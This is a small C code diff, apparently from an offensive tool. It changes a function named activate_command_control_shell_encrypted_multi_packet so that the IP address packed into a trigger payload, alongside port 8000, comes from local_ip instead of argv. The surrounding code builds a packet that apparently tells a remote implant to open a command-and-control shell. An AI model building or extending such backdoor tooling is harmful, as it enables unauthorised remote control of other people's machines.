@@ -566,7 +566,7 @@ void activate_command_control_shell_encrypted_multi_packet(char* argv, int mode)
     for(int ii=0; ii<PAYLOAD_LEN; ii++){
         payload[ii] = (char)rand();
     }
-    inet_pton(AF_INET, argv, (void*)(payload+0x01));
+    inet_pton(AF_INET, local_ip, (void*)(payload+0x01));
     uint16_t port = htons(8000);
     memcpy(payload+0x05, (char*)&port, 0x02);
     char result[0x03];
